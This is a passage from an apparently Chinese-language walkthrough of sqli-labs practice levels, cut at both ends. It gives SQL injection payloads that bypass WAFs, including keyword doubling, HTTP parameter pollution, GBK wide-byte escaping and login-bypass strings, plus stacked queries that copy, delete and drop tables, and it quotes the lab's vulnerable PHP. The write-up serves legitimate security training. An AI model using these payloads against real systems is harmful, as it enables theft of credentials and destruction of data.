class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;%0Aand%0Atable_name=&#x27;</span>users<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span> 查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,&#x27;</span>.<span class="string">&#x27;,username,&#x27;</span>.<span class="string">&#x27;,password,&#x27;</span>.<span class="string">&#x27;)%0Afrom%0Asecurity.users),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="29关：有WAF-对参数进行高效过滤"><a href="#29关：有WAF-对参数进行高效过滤" class="headerlink" title="29关：有WAF 对参数进行高效过滤"></a><strong>29关：有WAF 对参数进行高效过滤</strong></h3><p>‘  闭合</p><p>绕过的方法是 **HPP (HTTP Parameter Pollution)**，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span> <span class="operator">/</span><span class="operator">/</span>两个参数</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="string">&#x27; order by 99999-- - //查字段数</span></span><br><span class="line"><span class="string">往下是和第一关一样的payload （简单）</span></span><br></pre></td></tr></table></figure><p>源码如下，源码通过了 java_implimentation() 方法获取到了 id 参数。接着源码使用 GET 方法获取 id 参数，并通过  whitelist() 方法判断参数是否合法。注意我们在上面传入了 2 个同名参数，使用 GET 方法获取到的是后面的参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> take the variables </span><br><span class="line">if(isset($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">      $qs <span class="operator">=</span> $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">      $hint <span class="operator">=</span> $qs;</span><br><span class="line">      $id1 <span class="operator">=</span> java_implimentation($qs);</span><br><span class="line">      $id <span class="operator">=</span> $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>echo $id1;</span><br><span class="line">      whitelist($id1);</span><br><span class="line"> </span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">      $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">      $<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">      $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line">      if($<span class="type">row</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">    echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">java_implimentation() 方法</span><br><span class="line"></span><br><span class="line">该方法将 <span class="keyword">GET</span> 读入的整行参数使用 explode() 方法对 “<span class="operator">&amp;</span>” 进行分割，返回一个分割后的数组。接着方法通过 substr() 方法提取对 “<span class="operator">&amp;</span>” 分割后的第一个元素的前 <span class="number">2</span> 个字符，若这 <span class="number">2</span> 个字符是 “id”，则再次使用 substr() 方法提取等号后面的值返回。注意该方法提取的是 <span class="number">2</span> 个同名变量中的第一个，因此它无法对第二个同名变量进行操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>WAF implimentation <span class="keyword">with</span> a whitelist approach..... <span class="keyword">only</span> allows input <span class="keyword">to</span> be Numeric.</span><br><span class="line"><span class="keyword">function</span> whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">      $<span class="keyword">match</span> <span class="operator">=</span> preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">      if($<span class="keyword">match</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are good&quot;;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span><span class="keyword">return</span> $<span class="keyword">match</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are bad&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">whitelist() 方法</span><br><span class="line"></span><br><span class="line">该方法使用正则表达式判断传入的参数是否是数字，若不是数字则跳转页面。由于注入 <span class="number">2</span> 个同名参数时，java_implimentation() 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了</span><br></pre></td></tr></table></figure><h3 id="30关：”-闭合，有WAF-高效过滤"><a href="#30关：”-闭合，有WAF-高效过滤" class="headerlink" title="30关：” 闭合，有WAF　高效过滤"></a><strong>30关：” 闭合，有WAF　高效过滤</strong></h3><p>使用参数污染</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span>&quot; order by 3-- -　／／查字段数</span><br><span class="line">往下和29关一样</span><br></pre></td></tr></table></figure><h3 id="31关：”-闭合，有WAF"><a href="#31关：”-闭合，有WAF" class="headerlink" title="31关：”) 闭合，有WAF"></a><strong>31关：”) 闭合，有WAF</strong></h3><p>使用参数污染，用第二个参数进行注入，同30关</p><h3 id="32关：单引号闭合，单引号参数被转义"><a href="#32关：单引号闭合，单引号参数被转义" class="headerlink" title="32关：单引号闭合，单引号参数被转义"></a><strong>32关：单引号闭合，单引号参数被转义</strong></h3><p>使用宽字节注入</p><p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; //宽字节注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1�\&#x27;&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line">这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 <span class="keyword">SQL</span> 查询了正确的参数(汉字)，从而可以使用 <span class="keyword">UNION</span> 语句进行注入</span><br></pre></td></tr></table></figure><p>开始注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; order by 3-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,@@version,database()-- - //查版本与当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata),database()<span class="comment">-- - //查所有数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3-- - //查表名注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>),<span class="number">3</span><span class="comment">-- - //查字段，同样要使用hex</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(0x7e,id,0x2e,username,0x2e,password)from security.users),3-- - //查数据</span></span><br></pre></td></tr></table></figure><p>可以看到 id 参数传入时，会先经过 check_addslashes() 函数，该函数起到的作用应该就是转义字符了。注意网页会把数据库的编码改成 GBK，给宽字节注入提供了可能性</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">$id <span class="operator">=</span> check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"> </span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">该函数使用正则表达式匹配字符，将 <span class="string">&#x27; 转义为 &#x27;</span> ， 将 \ 转义为 \ ，将 &quot; 转义为 &quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, &quot;\\\\\\&quot;, $string);      <span class="operator">/</span><span class="operator">/</span>把\\变成斜体，再使用\\\\\\去替换</span><br><span class="line">      backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&#x27;</span><span class="operator">/</span>i<span class="string">&#x27;, &#x27;</span>\\\<span class="string">&#x27;&#x27;</span>, $string);                           <span class="operator">/</span><span class="operator">/</span><span class="keyword">escape</span> single quote <span class="keyword">with</span> a backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, &quot;\\\&quot;&quot;, $string);                            //escape double quote with a backslash</span><br><span class="line"> </span><br><span class="line">      return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preg_replace() 搜索第3参数中匹配第1参数的部分，以第2参数进行替换</span><br><span class="line"></span><br><span class="line">preg_quote() 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 这通常用于你有一些运行时字符串 需要作为正则表达式进行匹配的时候。</span><br><span class="line">正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : -</span><br></pre></td></tr></table></figure><h3 id="33关：与32一模一样"><a href="#33关：与32一模一样" class="headerlink" title="33关：与32一模一样"></a><strong>33关：与32一模一样</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> addslashes($string);    </span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">此处的过滤函数是 addslashes() 函数，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠</span><br></pre></td></tr></table></figure><h3 id="34关：POST-‘-闭合-宽字节注入"><a href="#34关：POST-‘-闭合-宽字节注入" class="headerlink" title="34关：POST  ‘ 闭合 宽字节注入"></a><strong>34关：POST  ‘ 闭合 宽字节注入</strong></h3><p>要通过 BP 操作 payload 就行了，和32关一样</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE71.png">    </p><h3 id="35关：数字型注入"><a href="#35关：数字型注入" class="headerlink" title="35关：数字型注入"></a><strong>35关：数字型注入</strong></h3><p>判断闭合，以下方式均闭合失败。可能是数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&#x27;</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1 and 1=1-- -正常</span></span><br><span class="line"><span class="string">?id=1 and 1=2-- -异常</span></span><br><span class="line"><span class="string">验证了它为数字型</span></span><br><span class="line"><span class="string">由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1 union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string">和第一关一样</span></span><br></pre></td></tr></table></figure><h3 id="36关：’-闭合-宽字节注入"><a href="#36关：’-闭合-宽字节注入" class="headerlink" title="36关：’ 闭合 宽字节注入"></a><strong>36关：’ 闭合 宽字节注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line">下面的payload 与<span class="number">32</span>关一样</span><br></pre></td></tr></table></figure><h3 id="37关：POST-‘-闭合-宽字节注入"><a href="#37关：POST-‘-闭合-宽字节注入" class="headerlink" title="37关：POST   ‘ 闭合 宽字节注入"></a><strong>37关：POST   ‘ 闭合 宽字节注入</strong></h3><p>和34关完全一样</p><h3 id="38关：’-闭合-堆叠注入’"><a href="#38关：’-闭合-堆叠注入’" class="headerlink" title="38关：’ 闭合 堆叠注入’"></a><strong>38关：’ 闭合 堆叠注入’</strong></h3><p>所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句,这是毁灭性的漏洞，骇客可以肆意操作数据库。这一关可以使用第一关的 payload 过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;CREATE TABLE a LIKE users;--+ //创建一张和users 一样的表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="comment">--+ //将user里的数据插入a表中</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;DELETE FROM a;--+//删除a表中的数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;<span class="comment">--+//删除a表</span></span><br></pre></td></tr></table></figure><p>可以看到源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;    </span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if ($<span class="keyword">result</span> <span class="operator">=</span> mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> mysqli_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  echo <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">                  printf(&quot;Your Username is : %s&quot;, $<span class="type">row</span>[<span class="number">1</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  printf(&quot;Your Password is : %s&quot;, $<span class="type">row</span>[<span class="number">2</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>mysqli_free_result($<span class="keyword">result</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* print divider */</span></span><br><span class="line">      if (mysqli_more_results($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>printf(&quot;-----------------\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="39关：数字型-堆叠注入"><a href="#39关：数字型-堆叠注入" class="headerlink" title="39关：数字型 堆叠注入"></a><strong>39关：数字型 堆叠注入</strong></h3><p>参考38关</p><h3 id="40关：’-闭合-堆叠注入"><a href="#40关：’-闭合-堆叠注入" class="headerlink" title="40关：’) 闭合 堆叠注入"></a><strong>40关：’) 闭合 堆叠注入</strong></h3><p>参考38关</p><h3 id="41关：数字型-堆叠注入"><a href="#41关：数字型-堆叠注入" class="headerlink" title="41关：数字型  堆叠注入"></a><strong>41关：数字型  堆叠注入</strong></h3><p>参考38关</p><h3 id="42关：POST-密码处-‘-闭合-二次注入，堆叠注入"><a href="#42关：POST-密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入"></a><strong>42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入</strong></h3><p>页面和24关的二次注入一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">用户处使用万能密码，失败</span><br><span class="line"><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&#x27;</span>) <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27;)) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;)) OR 1 = 1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码处使用万能密码，成功，说明用户处存在过滤</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">然后开始堆叠注入  参考<span class="number">38</span>关</span><br><span class="line">a<span class="string">&#x27; or 1 = 1;CREATE TABLE a LIKE users;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;#</span><br><span class="line"></span><br><span class="line">a<span class="string">&#x27; or 1 = 1;DELETE FROM a;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;#</span><br></pre></td></tr></table></figure><p>username 字段使用 mysqli_real_escape_string() 函数进行转义，而 password 字段没有任何防御措施</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 